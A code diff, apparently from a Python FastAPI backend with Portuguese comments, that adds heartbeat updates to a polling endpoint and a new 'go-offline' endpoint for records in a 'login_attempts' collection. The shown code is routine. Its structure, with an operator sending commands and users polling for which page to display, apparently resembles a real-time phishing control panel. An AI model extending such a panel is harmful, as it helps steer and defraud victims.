@@ -332,10 +332,16 @@ async def send_command(command: CommandRequest, token_data: dict = Depends(verif
 
 @api_router.get("/user/check-action/{user_id}")
 async def check_user_action(user_id: str):
-    """Usuário verifica qual ação deve realizar (NÃO atualiza heartbeat)"""
+    """Usuário verifica qual ação deve realizar + atualiza heartbeat"""
     user = await db.login_attempts.find_one({"id": user_id}, {"_id": 0})
     if not user:
         return {"action": None, "page": "Página Loading...", "action_timestamp": None}
+    
+    # Atualizar heartbeat sempre que pollar
+    await db.login_attempts.update_one(
+        {"id": user_id},
+        {"$set": {"last_heartbeat": datetime.now(timezone.utc).isoformat()}}
+    )
     
     return {
         "action": user.get("current_action"),
@@ -347,12 +353,19 @@ async def check_user_action(user_id: str):
 
 @api_router.post("/user/heartbeat/{user_id}")
 async def user_heartbeat(user_id: str):
-    """Atualiza heartbeat - APENAS chamado quando aba está visível"""
+    """Heartbeat manual"""
     await db.login_attempts.update_one(
         {"id": user_id},
-        {"$set": {
-            "last_heartbeat": datetime.now(timezone.utc).isoformat()
-        }}
+        {"$set": {"last_heartbeat": datetime.now(timezone.utc).isoformat()}}
+    )
+    return {"ok": True}
+
+@api_router.post("/user/go-offline/{user_id}")
+async def user_go_offline(user_id: str):
+    """Marca offline imediatamente - zera o heartbeat"""
+    await db.login_attempts.update_one(
+        {"id": user_id},
+        {"$set": {"last_heartbeat": "2000-01-01T00:00:00+00:00"}}
     )
     return {"ok": True}
 
